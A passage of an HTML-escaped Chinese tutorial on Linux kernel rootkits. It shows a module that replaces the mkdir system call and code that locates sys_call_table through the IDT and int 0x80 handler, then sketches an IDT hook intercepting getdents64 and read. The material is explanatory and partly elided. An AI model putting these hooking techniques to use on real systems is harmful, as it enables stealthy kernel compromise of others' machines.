class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MODULE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; __KERNEL__&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/module.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/kernel.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;asm/unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/syscall.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;asm/fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;asm/errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/dirent.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/fs.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* sys_call_table[];       &lt;span class=&quot;comment&quot;&gt;/*sys_call_table is exported, so we&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                     can access it*/&lt;/span&gt;               &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*orig_mkdir)(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *path); &lt;span class=&quot;comment&quot;&gt;/*the original systemcall*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hacked_mkdir&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *path)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;                           &lt;span class=&quot;comment&quot;&gt;/*everything is ok, but he new systemcall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                     does nothing*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;init_module&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;                &lt;span class=&quot;comment&quot;&gt;/*module setup*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; orig_mkdir=sys_call_table[SYS_mkdir];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; sys_call_table[SYS_mkdir]=hacked_mkdir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cleanup_module&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;            &lt;span class=&quot;comment&quot;&gt;/*module shutdown*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; sys_call_table[SYS_mkdir]=orig_mkdir; &lt;span class=&quot;comment&quot;&gt;/*set mkdir syscall to the origal&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       one*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，要对系统调用(sys_call_table)进行替换，却必须要获取该地址后才可以进行替换。但是Linux 2.6版的内核出于安全的考虑没有将系统调用列表基地址的符号sys_call_table导出，但是我们可以采取一些hacking的方式进行获取。&lt;br&gt;因为系统调用都是通过0x80中断来进行的，故可以通过查找0x80中断的处理程序来获得sys_call_table的地址。其基本步骤是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取中断描述符表(IDT)的地址(使用C ASM汇编)&lt;/li&gt;
&lt;li&gt;从中查找0x80中断(系统调用中断)的服务例程(8*0x80偏移)&lt;/li&gt;
&lt;li&gt;搜索该例程的内存空间，&lt;/li&gt;
&lt;li&gt;从其中获取sys_call_table(保存所有系统调用例程的入口地址)的地址&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有关获取IDT表地址的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unsigned long get_addr_idt (void)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         unsigned char idtr[6];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         unsigned long idt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        idt = *((unsigned long *) &amp;amp;idtr[2]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return(idt);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取syscall table地址的方法还有许多，更多可参考 &lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3854977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux System Calls Hooking Method Summary&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;对于 1)类型的rootkit相当于将系统调用的hook转移到了 对80中断的hook，具体可参考 &lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3910696.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Rootkit Hacking Technology &amp;amp;&amp;amp; Defence Strategy Research&lt;/a&gt;&lt;br&gt;以及&lt;br&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/59/4.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Phrack issue 59, article 0x04 (“Handling the Interrupt Descriptor Table”&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相关代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1. 通过&quot;中断寄存器&quot;获取中断描述符表(IDT)的地址(使用C ASM汇编)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;asm(&quot;sidt %0&quot;:&quot;=m&quot;(idt48));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. 从中查找0x80中断(&quot;0x80中断&quot;就是&quot;系统调用中断&quot;)的服务例程(8*0x80偏移)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&quot;中断描述符表(IDT)&quot;中有很多项，每项8个字节，而第0x80项才是系统调用对应的中断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct descriptor_idt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short offset_low;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short ignore1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short ignore2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short offset_high;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;static struct &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short limit;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned long base;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;__attribute__ ((packed)) idt48;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;system_call_addr = (pIdt80-&amp;gt;offset_high &amp;lt;&amp;lt; 16 | pIdt80-&amp;gt;offset_low);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. 搜索该例程的内存空间，获取&quot;系统调用函数表&quot;的地址(&quot;系统调用函数表&quot;根据系统调用号作为索引保存了linux系统下的所有系统调用的入口地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for (i=0; i&amp;lt;100; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (p==&#39;\xff&#39; &amp;amp;&amp;amp; p[i+1]==&#39;\x14&#39; &amp;amp;&amp;amp; p[i+2]==&#39;\x85&#39;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sys_call_table = *(unsigned int*)(p+i+3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        printk(&quot;addr of sys_call_table: %x\n&quot;, sys_call_table);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4. 将sys_call_table作为基址，根据系统调用号作为索引，获取指定的系统调用的函数地址指针，因为我们通过劫持80中断进而达到系统调用劫持的目的后，还需要将代码控制流重新导向原始的系统调用&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;orig_read = sys_call_table[__NR_read]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;orig_getdents64 = sys_call_table[__NR_getdents64];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;replace&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5. 直接替换IDT中的某一项，也就是我们需要通过代码模拟原本&quot;系统调用中断例程(IDT[0x80])&quot;的代码逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void new_idt(void)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ASMIDType&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;cmp %0, %%eax      \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;jae syscallmala        \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;jmp hook               \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;syscallmala:           \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;jmp dire_exit          \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                : : &quot;i&quot; (NR_syscalls)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void hook(void)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    register int eax asm(&quot;eax&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    switch(eax)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        case __NR_getdents64:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            CallHookedSyscall(Sys_getdents64);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            break;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        case __NR_read:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            CallHookedSyscall(Sys_read);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               break; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        default:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            JmPushRet(dire_call);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           break;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    //jmp to original syscall idt handler &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JmPushRet( after_call );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
